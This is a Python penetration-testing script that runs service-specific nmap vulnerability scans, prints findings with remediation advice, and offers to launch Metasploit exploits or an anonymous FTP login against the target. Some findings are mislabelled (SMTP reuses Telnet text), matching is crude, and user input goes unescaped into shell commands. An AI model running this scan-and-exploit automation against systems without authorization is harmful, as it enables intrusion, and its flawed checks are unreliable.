#!/usr/bin/python3
import os
import sys
import subprocess
import re

# Define color codes
RESTORE = '\033[0m'
BLACK = '\033[00;30m'
RED = '\033[00;31m'
GREEN = '\033[00;32m'
YELLOW = '\033[00;33m'
BLUE = '\033[00;34m'
PURPLE = '\033[00;35m'
CYAN = '\033[00;36m'
LIGHTGRAY = '\033[00;37m'
LBLACK = '\033[01;30m'
LRED = '\033[01;31m'
LGREEN = '\033[01;32m'
LYELLOW = '\033[01;33m'
LBLUE = '\033[01;34m'
LPURPLE = '\033[01;35m'
LCYAN = '\033[01;36m'
WHITE = '\033[01;37m'
OVERWRITE = '\e[1A\e[K'

# Main function


def main():
    def parser():
        script_name = sys.argv[0]
        print(f"""
{LCYAN}
                _         __                     
 /\   /\ _   _ | | _ __  / _\ _   _  _ __    ___ 
 \ \ / /| | | || || '_ \ \ \ | | | || '_ \  / __|
  \ V / | |_| || || | | |_\ \| |_| || | | || (__ 
   \_/   \__,_||_||_| |_|\__/ \__, ||_| |_| \___|
                              |___/              
{RESTORE}

Usage: {script_name} [options] Target

Options:
    {LBLUE}-h, --help{RESTORE}              Show this help message and exit
    {LBLUE}--fast-scan{RESTORE}             Perform a fast scan
    {LBLUE}--full-scan{RESTORE}             Perform a full scan
    {LBLUE}--full-vuln{RESTORE}             Perform a full scan with vuln (Recommended)
    {LBLUE}--ftp{RESTORE}                   Perform a scanning port 21
    {LBLUE}--ssh{RESTORE}                   Perform a scanning port 22
    {LBLUE}--telnet{RESTORE}                Perform a scanning port 23
    {LBLUE}--smtp{RESTORE}                  Perform a scanning port 25, 465, 587
    {LBLUE}--web{RESTORE}                   Perform a scanning port 80, 443
    {LBLUE}--smb{RESTORE}                   Perform a scanning port 139, 445
    {LBLUE}--ldap{RESTORE}                  Perform a scanning port 389, 636, 3268, 3269
    {LBLUE}--mssql{RESTORE}                 Perform a scanning port 1433
    {LBLUE}--mysql{RESTORE}                 Perform a scanning port 3306
    {LBLUE}--rdp{RESTORE}                   Perform a scanning port 3389
    {LBLUE}--cassandra{RESTORE}             Perform a scanning port 9042, 9160
    {LBLUE}--cipher{RESTORE}                Perform a scanning cipher vuln
    {LBLUE}-o, --output OUTPUT{RESTORE}     Specify the custom output file name

Example:
    {script_name} --fast-scan target
    {script_name} --ssh target
""")

    ip = None
    output_file = "output.txt"  # Default output file name
    fast_scan = False
    full_scan = False
    full_vuln = False
    ssh = False
    ftp = False
    telnet = False
    smtp = False
    dns = False
    smb = False
    smb_brute = False
    snmp = False
    mssql = False
    mysql = False
    rdp = False
    cassandra = False
    cipher_scan = False
    ldap = False
    web = False

    args = sys.argv[1:]
    while args:
        arg = args.pop(0)
        if arg in ["-h", "--help"]:
            parser()
            sys.exit(0)
        elif arg in ["-o", "--output"]:
            output_file = args.pop(0)
        elif arg == "--cipher":
            cipher_scan = True
        elif arg == "--web":
            web = True
        elif arg == "--fast-scan":
            fast_scan = True
        elif arg == "--full-scan":
            full_scan = True
        elif arg == "--full-vuln":
            full_vuln = True
        elif arg == "--ftp":
            ftp = True
        elif arg == "--ssh":
            ssh = True
        elif arg == "--telnet":
            telnet = True
        elif arg == "--smtp":
            smtp = True
        # elif arg == "--dns":
        #     dns = True
        elif arg == "--smb":
            smb = True
        elif arg == "--smb-brute":
            smb_brute = True
        # elif arg == "--snmp":
        #     snmp = True
        elif arg == "--mssql":
            mssql = True
        elif arg == "--mysql":
            mysql = True
        elif arg == "--rdp":
            rdp = True
        elif arg == "--cassandra":
            cassandra = True
        elif arg == "--ldap":
            ldap = True
        else:
            ip = arg

    # Check if an input file is provided
    if ip is None:
        print(f"{RED}Error: Please provide Target.{RESTORE}")
        parser()
        sys.exit(1)

    command = None
    if fast_scan:
        command = f"sudo nmap -sV -sC -O -T4 -n -oA fastscan {ip} -oN {output_file} -vv"
    elif full_scan:
        command = f"sudo nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan {ip} -oN {output_file} -vv"
    elif full_vuln:
        command = f"sudo nmap -sV --script=vulners.nse --script=vulners --script=vuln {ip} -oN {output_file}"
    elif ftp:
        command = f"sudo nmap -sV -p21 -sC -A -Pn --script=ftp-anon {ip} -oN {output_file} -vv"
    elif ssh:
        command = f"sudo nmap -p22 -sC -Pn -sV --script ssh2-enum-algos --script ssh-auth-methods {ip} -oN {output_file} -vv"
    elif telnet:
        command = f"sudo nmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 {ip} -oN {output_file} -vv"
    elif smtp:
        command = f"sudo nmap -Pn -sV --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25,465,587 {ip} -oN {output_file} -vv"
    # elif dns:
    #     command = f"sudo nmap -Pn -sV -n --script '(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport' -p- {ip} -oN {output_file} -vv"
    elif smb:
        command = f"sudo nmap -p 139,445 -vv -Pn --script smb-security-mode.nse --script smb2-security-mode --script smb-vuln* --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {ip} -oN {output_file} -vv"
    elif smb_brute:
        command = f"sudo nmap --script smb-vuln* -Pn -p 139,445 {ip} -oN {output_file} -vv"
    # elif snmp:
    #     command = f"sudo nmap -Pn -p 161,162,10161,10162 -sV --script \"snmp* and not snmp-brute\" {ip} -oN {output_file} -vv"
    elif mssql:
        command = f"sudo nmap -Pn --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {ip} -oN {output_file} -vv"
    elif mysql:
        command = f"sudo nmap -Pn -sV --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse -p 3306 {ip} -oN {output_file} -vv"
    elif rdp:
        command = f"sudo nmap -sV -Pn --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 {ip} -oN {output_file} -vv"
    elif cassandra:
        command = f"sudo nmap -sV -Pn --script cassandra-info -p 9042,9160 {ip} -oN {output_file} -vv"
    elif cipher_scan:
        command = f"sudo nmap -sV -p 80,443 -Pn --script ssl-enum-ciphers {ip} -oN {output_file} -vv"
    elif ldap:
        command = f"sudo nmap -sV -Pn --script \"ldap* and not brute\" --script ldap-search -p 389,636,3268,3269 {ip} -oN {output_file} -vv"
    elif web:
        command = f"sudo nmap -T4 --reason -Pn -sV -p 443 --script='banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)' {ip} -oN {output_file} -vv"
    else:
        print(f"{RED}Error: Please specify a valid scan option.{RESTORE}")
        parser()
        sys.exit(1)

    # Execute the Nmap command
    hosts = f"clear"
    os.system(hosts)
    print(f"{LCYAN}")
    print("                _         __                     ")
    print(" /\   /\ _   _ | | _ __  / _\ _   _  _ __    ___ ")
    print(" \ \ / /| | | || || '_ \ \ \ | | | || '_ \  / __|")
    print("  \ V / | |_| || || | | |_\ \| |_| || | | || (__ ")
    print("   \_/   \__,_||_||_| |_|\__/ \__, ||_| |_| \___|")
    print("                              |___/              ")
    print(f"{RESTORE}")
    print("")
    print(f"{LYELLOW}Created by MarmutHandsome{RESTORE}")
    print(f"{LBLUE}Version 2.0{RESTORE}")  # Version Update
    print("")
    print(f"{GREEN}Starting!!!{RESTORE}")
    print("")
    print(f"{GREEN}On Progress!!! (Please be patient) {RESTORE}")
    print("")
    print(f"{GREEN}+++=======================================================+++{RESTORE}")
    print("")
    try:
        with open(os.devnull, 'w') as nullfile:
            subprocess.check_call(command, shell=True,
                                  stdout=nullfile, stderr=nullfile)
            print(f"{GREEN}Scan completed successfully!{RESTORE}")
            print("")
            print(f"{YELLOW}Result For {ip}!{RESTORE}")
            print("")
    except subprocess.CalledProcessError:
        print(f"{RED}Error occurred while running the Nmap scan.{RESTORE}")

    # Fast Scan
    if fast_scan:
        # Output
        print("")
        print(f"{CYAN}Open Port: {RESTORE}")
        hosts = f"grep --color syn-ack output.txt"
        os.system(hosts)
        print("")
        print(f"{CYAN}Close Port: {RESTORE}")
        hosts = f"grep --color 'filtered\|closed' output.txt"
        os.system(hosts)
        print("")

    # Full Scan
    elif full_scan:
        # Output
        print("")
        print(f"{CYAN}Open Port: {RESTORE}")
        hosts = f"grep --color syn-ack output.txt"
        os.system(hosts)
        print("")
        print(f"{CYAN}Close Port: {RESTORE}")
        hosts = f"grep --color 'filtered\|closed' output.txt"
        os.system(hosts)
        print("")

    # Full Vuln
    elif full_vuln:
        # Output
        print("")
        print(f"{CYAN}Open Port: {RESTORE}")
        hosts = f"grep --color syn-ack output.txt"
        os.system(hosts)
        print("")
        print(f"{CYAN}Close Port: {RESTORE}")
        hosts = f"grep --color 'filtered\|closed' output.txt"
        os.system(hosts)
        print("")

        def run_metasploit(selected_vulnerability, selected_port, ip):
            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT {selected_port}; run; exit'"
            os.system(metasploit_command)

        # Read content from the file
        with open("output.txt", "r") as file:
            sample_output = file.read()

        # Define patterns for port and vulnerability
        port_pattern = re.compile(r"(\d+)/tcp\s+open\s+(\S+)")
        vulnerability_pattern = re.compile(
            r"VULNERABLE:(.*?)State: VULNERABLE", re.DOTALL)

        # Find open ports
        open_ports = re.findall(port_pattern, sample_output)

        # Find vulnerabilities
        vulnerabilities = re.findall(vulnerability_pattern, sample_output)

        exploit_again = True

        while exploit_again:
            # Iterate through each port
            for port, service in open_ports:
                # Find vulnerabilities for the current port
                vulnerabilities_for_port = re.findall(
                    rf"{port}/tcp[^V]+VULNERABLE:(.*?)State: VULNERABLE", sample_output, re.DOTALL)

                # Only print information for ports with vulnerabilities
                if vulnerabilities_for_port:
                    print(
                        f"{RED}Vulnerable Port: {port}/tcp open {service} {RESTORE}")
                    print("Vulnerabilities:")
                    for vulnerability in vulnerabilities_for_port:
                        # Extract the relevant information from the nested structure
                        vuln_info = re.search(
                            r"\|(.+?)\n", vulnerability, re.DOTALL)
                        if vuln_info:
                            print(vuln_info.group(1).strip())

                    # Add a line break after printing vulnerabilities for the current port
                    print()

            # Ask user for input
            selected_vulnerability = input(
                "Which Vulnerability You Need to Exploit? ")
            selected_port = input("Which Port? ")
            # selected_ip = input("Which IP? ")  # Remove This For Production
            print("")

            run_metasploit(selected_vulnerability, selected_port, ip)

            # Ask if the user wants to exploit again
            print("")
            user_choice = input(
                "Thanks For Using This Tool! Exploit Again (yes/no)? ").lower()
            exploit_again = user_choice == "yes"

        print("")
        print("Goodbye!")

    # Port 21 (Done)
    elif ftp:
        # Output
        print("")
        print(f"{CYAN}Open Port: {RESTORE}")
        hosts = f"grep --color syn-ack output.txt"
        os.system(hosts)
        print("")
        print(f"{RED}Vulnerabilities For Port: {RESTORE}")
        hosts = f"grep -m1 21/tcp output.txt"  # Change This
        os.system(hosts)

        # def run_metasploit(selected_vulnerability, selected_port, ip):
        #     metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT {selected_port}; run; exit'"
        #     os.system(metasploit_command)

        # Function to check for and display vulnerabilities
        def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
            hosts = f"grep -q -oh '{grep_pattern}' output.txt"
            if os.system(hosts) == 0:
                print("")
                print(f"{RED}Vulnerability{RESTORE}: {vulnerability_name}")
                print(f"{RED}Severity{RESTORE}: {severity}")
                print(f"{RED}Impact {RESTORE}: {description}")
                print("")
                print(f"{LPURPLE}Recommendation {RESTORE}: {recommendation}")
                print("")
                print("+++=======================================================+++")
                print("")

        # Check and display each vulnerability
        check_and_display_vulnerability(
            "Anonymous FTP login allowed",
            "Anonymous FTP login allowed",
            "Low - High",
            "\nSecurity Risk: Allowing anonymous FTP login can pose a significant security risk. It means that anyone can access and potentially upload or download files from your FTP server without authentication. This could lead to unauthorized access, data breaches, or the uploading of malicious files.",
            "\nDisable Anonymous FTP: The most effective way to mitigate this risk is to disable anonymous FTP login altogether. This can usually be done in your FTP server's configuration. By doing so, you ensure that only authorized users can access the FTP server."
        )

        # Prompt the user for exploitation after displaying all vulnerabilities
        print("")
        exploit_choice = input(
            f"{BLUE}Do you want to exploit any of the vulnerabilities? {RESTORE}(yes/no): ").lower()

        # Check user's choice and call the function accordingly
        if exploit_choice == 'yes':

            metasploit_command = f"ftp anonymous@{ip}"
            print("")
            print(f"{CYAN}Notes: {RESTORE}")
            print(f"{CYAN}Insert Password: {RESTORE}anonymous")
            print(f"{CYAN}List Directory: ls -a {RESTORE}")
            print(f"{CYAN}Exit: bye {RESTORE}")
            print(f"")
            os.system(metasploit_command)

            print("")
            print("")
            print(
                f"{RED}Vulnerability {RESTORE}Anonymous FTP login allowed = {GREEN}VALID {RESTORE}")

            print("")
            print(f"{CYAN}Thanks For Using This Tool! {RESTORE}")

        elif exploit_choice == 'no':
            print("Not exploiting any vulnerabilities.")
        else:
            print("Invalid choice. Please enter 'yes' or 'no'.")

    # Port 22 ()
    elif ssh:
        # Output
        print("")
        print(f"{CYAN}Open Port: {RESTORE}")
        hosts = f"grep --color syn-ack output.txt"
        os.system(hosts)
        # print("")
        # print(f"{CYAN}Close Port: {RESTORE}")
        # hosts = f"grep --color 'filtered\|closed' output.txt"
        # os.system(hosts)
        print("")
        print(f"{RED}Vulnerabilies For Port: {RESTORE}")
        hosts = f"grep -m1 22/tcp output.txt"  # Change This
        os.system(hosts)

        # Function to check for and display vulnerabilities
        def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
            hosts = f"grep -q -oh '{grep_pattern}' output.txt"
            if os.system(hosts) == 0:
                print("")
                print(f"{RED}Vulnerability{RESTORE}: {vulnerability_name}")
                print(f"{RED}Severity{RESTORE}: {severity}")
                print(f"{RED}Impact {RESTORE}: {description}")
                print("")
                print(f"{LPURPLE}Recommendation {RESTORE}: {recommendation}")
                print("")
                print("+++=======================================================+++")
                print("")

        # Check and display each vulnerability
        check_and_display_vulnerability(
            "SSH Authentication Methods Enumeration",
            "ssh-auth-methods",
            "Informational",
            "\nSecurity Risk: Enumerating SSH authentication methods can reveal potentially insecure methods, which could be targeted by attackers.",
            "\nDisable Weak Methods: Disable deprecated and weak authentication methods (e.g., password-based authentication and publickey-based authentication) in favor of more secure methods such as public key-based authentication."
        )

        check_and_display_vulnerability(
            "Weak SSH Enumeration Algorithms",
            "3des-cbc\|arcfour\|rc4",
            "Informational",
            "\nSecurity Risk: The use of weak SSH enumeration algorithms such as 3des-cbc, arcfour, and rc4 poses a significant security risk. These algorithms have known vulnerabilities and weaknesses that can be exploited by attackers to compromise the confidentiality and integrity of SSH communications.",
            "\nUpdate SSH Configuration: It is strongly recommended to update the SSH server configuration to disallow the use of weak encryption algorithms, including 3des-cbc, arcfour, and rc4."
        )

        check_and_display_vulnerability(
            "Insecure SSH Authentication Methods",
            "publickey\|password",
            "Informational",
            "\nDiscovered that the SSH server supports both the 'publickey' and 'password' authentication methods, potentially exposing the system to security risks.",
            "\nThis configuration exposes the system to the risk of brute force attacks, where attackers may attempt to gain unauthorized access using weak passwords or by exploiting vulnerabilities in the public key authentication process."
        )

    # Port 23 ()
    elif telnet:
        # Output
        print("")
        print(f"{CYAN}Open Port: {RESTORE}")
        hosts = f"grep --color open output.txt"
        os.system(hosts)
        # print("")
        # print(f"{CYAN}Close Port: {RESTORE}")
        # hosts = f"grep --color 'filtered\|closed' output.txt"
        # os.system(hosts)
        print("")
        print(f"{RED}Vulnerabilies For Port: {RESTORE}")
        hosts = f"grep 23/tcp output.txt"  # Change This
        os.system(hosts)

        # Function to check for and display vulnerabilities
        def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
            hosts = f"grep -q -oh '{grep_pattern}' output.txt"
            if os.system(hosts) == 0:
                print("")
                print(f"{RED}Vulnerability{RESTORE}: {vulnerability_name}")
                print(f"{RED}Severity{RESTORE}: {severity}")
                print(f"{RED}Impact {RESTORE}: {description}")
                print("")
                print(f"{LPURPLE}Recommendation {RESTORE}: {recommendation}")
                print("")
                print("+++=======================================================+++")
                print("")

        # Check and display each vulnerability
        check_and_display_vulnerability(
            "Telnet Server Without Encryption Support",
            "Telnet server does not support encryption",
            "Informational",
            "\nSecurity Risk: Telnet is inherently insecure as it transmits data, including login credentials, in plain text. Without encryption support, sensitive information is vulnerable to eavesdropping by malicious actors.",
            "\nImplement Secure Alternatives: Replace Telnet with more secure alternatives such as SSH (Secure Shell), which encrypts communication and provides stronger security. |\n | Disable Telnet: If possible, disable the Telnet service on the server to eliminate the security risk associated with plaintext communication."
        )

    # Port 25 (Hard)
    elif smtp:
        # Output
        print("")
        print(f"{CYAN}Open Port: {RESTORE}")
        hosts = f"grep --color open output.txt"
        os.system(hosts)
        print("")

        # Function to check for and display vulnerabilities
        def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
            hosts = f"grep -q -oh '{grep_pattern}' output.txt"
            if os.system(hosts) == 0:
                print("")
                print(f"{RED}Vulnerability{RESTORE}: {vulnerability_name}")
                print(f"{RED}Severity{RESTORE}: {severity}")
                print(f"{RED}Impact {RESTORE}: {description}")
                print("")
                print(f"{LPURPLE}Recommendation {RESTORE}: {recommendation}")
                print("")
                print("+++=======================================================+++")

        # Check and display each vulnerability
        check_and_display_vulnerability(
            "Exim privileges escalation vulnerability (CVE-2010-4345)",
            "Exim\|privileges\|escalation\|vulnerability",
            "Informational",
            "Security Risk: Telnet is inherently insecure as it transmits data, including login credentials, in plain text. Without encryption support, sensitive information is vulnerable to eavesdropping by malicious actors.",
            "Implement Secure Alternatives: Replace Telnet with more secure alternatives such as SSH (Secure Shell), which encrypts communication and provides stronger security. |\n | Disable Telnet: If possible, disable the Telnet service on the server to eliminate the security risk associated with plaintext communication."
        )

        # Prompt the user for exploitation after displaying all vulnerabilities
        print("")
        exploit_choice = input(
            f"{BLUE}Do you want to exploit any of the vulnerabilities? {RESTORE}(yes/no): ").lower()

        # Check user's choice and call the function accordingly
        if exploit_choice == 'yes':
            print("")
            selected_vulnerability = input(
                "Which Vulnerability You Need to Exploit? ")
            ip = input("IP/URL Target? ")
            selected_lhost = input(
                "IP/URL Your Device/VPN (Default en0)? ").lower()

            print("")

            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 445; set LHOST {selected_lhost}; run; exit'"
            os.system(metasploit_command)

            print("")
            print(
                f"{RED}Vulnerability {RESTORE}{selected_vulnerability} = {GREEN}VALID {RESTORE}")

            print("")
            print(f"{CYAN}Thanks For Using This Tool! {RESTORE}")

        elif exploit_choice == 'no':
            print("Not exploiting any vulnerabilities.")
        else:
            print("Invalid choice. Please enter 'yes' or 'no'.")

    # Port 80 / 443 (Done)
    elif web:
        # Output
        print("")
        print(f"{CYAN}Open Port: {RESTORE}")
        hosts = f"grep --color open output.txt"
        os.system(hosts)
        # print("")
        # print(f"{CYAN}Close Port: {RESTORE}")
        # hosts = f"grep --color 'filtered\|closed' output.txt"
        # os.system(hosts)
        print("")
        print(f"{RED}Vulnerabilies For Port: {RESTORE}")
        hosts = f"grep 443/tcp output.txt"  # Change This
        os.system(hosts)

        # Function to check for and display vulnerabilities
        def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
            hosts = f"grep -q -oh '{grep_pattern}' output.txt"
            if os.system(hosts) == 0:
                print("")
                print(f"{RED}Vulnerability{RESTORE}: {vulnerability_name}")
                print(f"{RED}Severity{RESTORE}: {severity}")
                print(f"{RED}Impact {RESTORE}: {description}")
                print("")
                print(f"{LPURPLE}Recommendation {RESTORE}: {recommendation}")
                print("")
                print("+++=======================================================+++")
                print("")

        # Check and display each vulnerability
        check_and_display_vulnerability(
            "HSTS not configured in HTTPS Server",
            "HSTS not configured in HTTPS Server",
            "Informational",
            "\nImproved Security: Enabling HSTS significantly enhances the security of your website by ensuring that all communications are encrypted using HTTPS. It mitigates risks associated with SSL-stripping attacks and prevents downgrade attacks.",
            "\nConfigure your web server to send the HSTS header in the HTTP response.\n| Strict-Transport-Security: max-age=31536000; includeSubDomains"
        )

        check_and_display_vulnerability(
            "Potentially risky methods: TRACE",
            "TRACE/|DELETE",
            "Informational",
            "\nImproved Security: The primary impact of fixing this issue is improved security. Disabling TRACE and implementing other security measures can help protect your web application from certain types of attacks and vulnerabilities.",
            "\nDisable TRACE Method: The most effective way to fix this issue is to disable the TRACE method altogether on your web server. This can usually be done in the web server configuration."
        )

        check_and_display_vulnerability(
            "64-bit block cipher 3DES vulnerable to SWEET32 attack",
            "64-bit block cipher 3DES vulnerable to SWEET32 attack",
            "Informational",
            "\nSecurity Improvement: Replacing 3DES with a more secure cipher, like AES, will significantly enhance the security of your data transmissions. It will protect against SWEET32 attacks, which exploit vulnerabilities in ciphers with 64-bit block sizes.",
            "\nReplace 3DES: Replace the 3DES (Triple Data Encryption Standard) cipher with a more secure alternative, such as AES (Advanced Encryption Standard). AES is widely considered to be secure and is not vulnerable to SWEET32 attacks."
        )

        check_and_display_vulnerability(
            "Broken cipher RC4 is deprecated by RFC 7465",
            "Broken cipher RC4 is deprecated by RFC 7465",
            "Informational",
            "\nSecurity Enhancement: Disabling RC4 is essential as it is known to have serious security weaknesses. By deprecating RC4, you prevent vulnerabilities like the BEAST attack and other cryptographic attacks.",
            "\nDisable RC4: Immediately disable the RC4 cipher suite in your SSL/TLS configurations. This should be done both on the server and client sides."
        )

        check_and_display_vulnerability(
            "TLSv1.0|TLSv1.1",
            "TLSv1.0\|TLSv1.1",
            "Informational",
            "\nSecurity Risk: TLSv1.0 and TLSv1.1 have known vulnerabilities that can be exploited by attackers to intercept and manipulate encrypted data. This poses a significant security risk to your system.",
            "\nUpgrade to TLSv1.2 or TLSv1.3: Upgrade your servers and applications to support TLSv1.2 or TLSv1.3. These versions are more secure and offer better protection against attacks.\n| Disable TLSv1.0 and TLSv1.1: Disable TLSv1.0 and TLSv1.1 on your servers and applications. Ensure that they are not used as negotiation options during the TLS handshake."
        )

    # Port 135 / 445 (Done)
    elif smb:
        # Output
        print("")
        print(f"{CYAN}Open Port: {RESTORE}")
        hosts = f"grep --color open output.txt"
        os.system(hosts)
        print("")

        # Function to check for and display vulnerabilities
        def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
            hosts = f"grep -q -oh '{grep_pattern}' output.txt"
            if os.system(hosts) == 0:
                print("")
                print(f"{RED}Vulnerability{RESTORE}: {vulnerability_name}")
                print(f"{RED}Severity{RESTORE}: {severity}")
                print(f"{RED}Impact {RESTORE}: {description}")
                print("")
                print(f"{LPURPLE}Recommendation {RESTORE}: {recommendation}")
                print("")
                print("+++=======================================================+++")

        # Check and display each vulnerability
        check_and_display_vulnerability(
            "Insecure Message Signing Configuration",
            "disabled",
            "Informational",
            "\nMessage signing is disabled, which is a dangerous default configuration. Without proper message signing, the application is vulnerable to data tampering and injection attacks, potentially leading to unauthorized access, data manipulation, or other security breaches.",
            "\nEnable Message Signing: Configure the application to use strong message signing mechanisms, such as HMAC (Hash-based Message Authentication Code) or digital signatures, to ensure the integrity and authenticity of transmitted data."
        )

        check_and_display_vulnerability(
            "SMB remote memory corruption vulnerability",
            "corruption",
            "High",
            "\nSuccessful exploitation of this vulnerability could allow an attacker to remotely corrupt memory in the SMB (Server Message Block) protocol implementation, leading to potential unauthorized access, data leakage, or denial of service.",
            "\nApply Security Updates: Regularly update and patch the affected systems to ensure that the SMB protocol implementation is up-to-date with the latest security fixes."
        )

        check_and_display_vulnerability(
            "Print Spooler Service Impersonation Vulnerability",
            "Impersonation",
            "High",
            "\nThis vulnerability could result in an attacker executing arbitrary code with the privileges of the Print Spooler service, which might lead to unauthorized access, data manipulation, or further exploitation of the host system.",
            "\nApply Security Updates: Ensure the Print Spooler service and the underlying operating system are up-to-date with the latest security patches."
        )

        check_and_display_vulnerability(
            "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
            "Remote\|Code\|Execution",
            "High - Critical",
            "\nThis finding indicates a critical vulnerability that allows an attacker to execute arbitrary code remotely on Microsoft SMBv1 servers. Exploiting this vulnerability can lead to unauthorized access, data theft, and potential compromise of the entire system.",
            "\nApply Security Updates: Immediately apply the relevant security patch (MS17-010) provided by Microsoft to address this vulnerability.\nDisable SMBv1: Consider disabling the outdated SMBv1 protocol if it's not required for specific applications."
        )

        # Prompt the user for exploitation after displaying all vulnerabilities
        print("")
        exploit_choice = input(
            f"{BLUE}Do you want to exploit any of the vulnerabilities? {RESTORE}(yes/no): ").lower()

        # Check user's choice and call the function accordingly
        if exploit_choice == 'yes':
            print("")
            selected_vulnerability = input(
                "Which Vulnerability You Need to Exploit? ")
            ip = input("IP/URL Target? ")
            selected_lhost = input(
                "IP/URL Your Device/VPN (Default en0)? ").lower()

            print("")

            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 445; set LHOST {selected_lhost}; run; exit'"
            os.system(metasploit_command)

            print("")
            print(
                f"{RED}Vulnerability {RESTORE}{selected_vulnerability} = {GREEN}VALID {RESTORE}")

            print("")
            print(f"{CYAN}Thanks For Using This Tool! {RESTORE}")

        elif exploit_choice == 'no':
            print("Not exploiting any vulnerabilities.")
        else:
            print("Invalid choice. Please enter 'yes' or 'no'.")

    hosts = f""
    os.system(hosts)
    print("")


if __name__ == "__main__":
    main()
